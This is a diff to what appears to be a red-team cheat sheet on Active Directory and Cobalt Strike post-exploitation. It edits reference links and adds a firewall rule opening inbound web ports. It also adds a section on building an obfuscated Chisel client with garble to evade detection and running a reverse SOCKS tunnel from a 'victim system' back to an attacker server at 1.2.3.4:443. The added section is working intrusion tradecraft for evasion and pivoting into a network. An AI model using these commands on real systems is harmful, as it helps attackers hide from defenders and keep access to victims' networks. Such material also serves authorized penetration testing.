@@ -16,21 +16,12 @@
 - [iRedTeam](https://www.ired.team/)
 - [HackTricks](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)
 - [LOLBAS](https://lolbas-project.github.io/)
-- [Malleable C2 Profile Collection](https://github.com/BC-SECURITY/Malleable-C2-Profiles)
+
 - [0xe7/PowerSploit - Active Fork](https://github.com/0xe7/PowerSploit)
     - (old) [PowerSploit - Active Fork (ZeroDayLab)](https://github.com/ZeroDayLab/PowerSploit)
 
 ### Guides
 - [Custom BloodHound Queries](https://github.com/hausec/Bloodhound-Custom-Queries)
-- [Impacket Guide](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)
-- [Attacking Domain Trusts (harmj0y)](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
-- [Breaking Forest Trusts (harmj0y)](http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
-- [Lateral Movement (specterOps)](https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f)
-- [Offensive Kerberose (specterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
-- [How Attackers Use Silver Tickets](https://adsecurity.org/?p=2011)
-- [Active Directory Exploitation Cheat Sheet (S1ckB0y1337)](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
-- [Cobalt Strike Cheat Sheet (S1ckB0y1337)](https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet)
-- [harmj0y's PowerView Tricks Cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 
 ---
 
@@ -149,6 +140,48 @@ beacon> shell net share DataShare=c:\likes
 
 # access
 > dir \\host\datashare
+```
+
+### Firewall
+
+```
+# add ingress port
+> New-NetFirewallRule -DisplayName 'HTTP-Inbound' -Profile @('Domain', 'Private') -Direction Inbound -Action Allow -Protocol TCP -LocalPort @('80', '443')
+```
+
+### Chisel
+
+#### Build
+
+To generate obfuscated Chisel binary, first install [burrowers/garble](https://github.com/burrowers/garble), then clone, and compile [jpillora/chisel](https://github.com/jpillora/chisel).
+
+> Note, to further evade, consider removing the server components from a client build. 
+
+```
+# install
+$ go install mvdan.cc/garble@latest
+
+# clone
+$ git clone https://github.com/jpillora/chisel
+
+# compile server
+$ cd chisel
+$ make linux
+
+# compile client
+$ GOOS=windows garble -literals -tiny build -trimpath -o chisel_garble-cli.exe
+```
+
+#### Execute SOCKS Proxy
+
+Start the server on the attack system and the client on the victim system:
+
+```
+# server - copy the 'fingerprint'
+$ ./chisel-linux_amd64 server -p 443 --reverse --socks5 --auth docevil:s0m3p@ssw0rd
+
+# client - input 'fingerprint'
+$ ./chisel_garble-cli.exe client --auth docevil:s0m3p@ssw0rd --fingerprint 'zbj1w+...' 1.2.3.4:443 R:socks
 ```
 
 ---
@@ -1481,7 +1514,7 @@ Get-ObjectACL -DistinguishedName "dc=companyx,dc=com" -ResolveGUIDs | ? { ($_.Ob
 ```
 
 ### Resources
-- https://github.com/PowerShellMafia/PowerSploit
+- [0xe7/PowerSploit - Active Fork](https://github.com/0xe7/PowerSploit)
 - https://powersploit.readthedocs.io/en/latest/Recon/
 - https://github.com/tevora-threat/SharpView
 - https://github.com/HunnicCyber/SharpSniper
@@ -1990,7 +2023,6 @@ beacon> runasadmin
 ```
 
 ### Resources
-- https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1
 - https://github.com/GhostPack/SharpUp
 - https://github.com/rasta-mouse/Watson
 - https://github.com/itm4n/PrivescCheck
